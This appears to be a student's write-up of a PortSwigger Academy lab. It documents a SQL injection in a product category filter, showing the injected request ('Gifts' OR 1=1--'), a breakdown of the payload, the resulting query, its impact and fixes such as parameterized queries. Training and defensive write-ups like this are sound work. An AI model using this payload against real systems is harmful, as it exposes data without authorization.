**Location:** `https://0a5a007503ac8026bf82615200d30072.web-security-academy.net/filter?category`

**Description:**
The application's product category filter is vulnerable to SQL injection. The category parameter in the WHERE clause is not properly sanitized, allowing attackers to manipulate the SQL query structure. This enables retrieval of hidden products and potentially sensitive database information.

**Proof of Concept:**

**Original Request (Normal):**

```http
GET /filter?category=Gifts  

Host: 0a5a007503ac8026bf82615200d30072.web-security-academy.net  

```

**Malicious Request (SQL Injection):**

```http
GET /filter?category=Gifts'+OR+1=1-- 

Host: 0a5a007503ac8026bf82615200d30072.web-security-academy.net

```

**Payload Analysis:**

- `Gifts'` - Closes the original string parameter
- `OR 1=1` - Always true condition that bypasses the WHERE filter  
- `--` - SQL comment to ignore remaining query

**Expected SQL Query Behavior:**

```sql
-- Original query (secure)
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- Injected query (vulnerable)  
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- Everything after -- is commented out
```

**Impact:**

- **Data Exposure:** Access to unreleased/hidden products that should not be visible
- **Business Logic Bypass:** Circumvention of application access controls
- **Information Disclosure:** Potential access to sensitive product data, pricing, or inventory information

**Fix:**

- **Immediate:** Implement parameterized queries/prepared statements
- **Use Object Relational Mapping(ORM)** Use ORM query-building APIs instead of raw SQL strings.
- **Validate Inputs** Check that the data fits expected patterns.

**Evidence:**
*Normal category filter shows only 3 products*

*SQL injection payload reveals >12 products including hidden*

## Conclusion

### Assessment Summary

This penetration test successfully identified a **critical SQL injection vulnerability** in the PortSwigger Academy lab application's product filtering functionality. The vulnerability allows unauthorized access to hidden product data through manipulation of the `category` parameter in the WHERE clause of the underlying SQL query.

## Lab Learning Summary

**Skills Practiced:**

- Manual SQL injection identification and exploitation
- WHERE clause manipulation techniques  
- Boolean-based SQL injection testing
- SQL comment injection (`--`) for query termination

**Key Takeaways:**

- Always test input parameters with SQL metacharacters first (`'`, `"`, `;`)
- The `OR 1=1` condition is effective for bypassing WHERE filters
- SQL comments (`--`, `/* */`) are crucial for ignoring unwanted query parts
- Comparing response differences helps confirm successful injection
- Even simple SQL injection can lead to significant data exposure

**Technical Learning:**

- Understanding how user input flows into SQL WHERE clauses
- Recognizing the difference between filtered and unfiltered results
- Importance of parameterized queries for prevention
